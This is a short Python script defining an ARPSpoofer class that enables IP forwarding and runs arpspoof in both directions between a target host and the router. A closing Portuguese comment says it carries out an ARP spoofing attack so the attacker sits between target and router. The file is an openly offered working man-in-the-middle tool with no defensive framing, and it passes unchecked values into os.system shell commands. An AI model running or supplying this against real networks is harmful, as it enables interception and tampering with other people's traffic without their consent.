import os

class ARPSpoofer:
    def __init__(self, target_ip, router_ip, interface="eth0"):
        self.target_ip = target_ip
        self.router_ip = router_ip
        self.interface = interface

    def enable_ip_forwarding(self):
        os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")

    def start_spoofing(self):
        os.system(f"sudo arpspoof -i {self.interface} -t {self.target_ip} {self.router_ip} &")
        os.system(f"sudo arpspoof -i {self.interface} -t {self.router_ip} {self.target_ip} &")

    def stop_spoofing(self):
        os.system("pkill arpspoof")

#executar o ataque de ARP Spoofing, para que o atacante se interponha na comunicação entre alvo-roteador.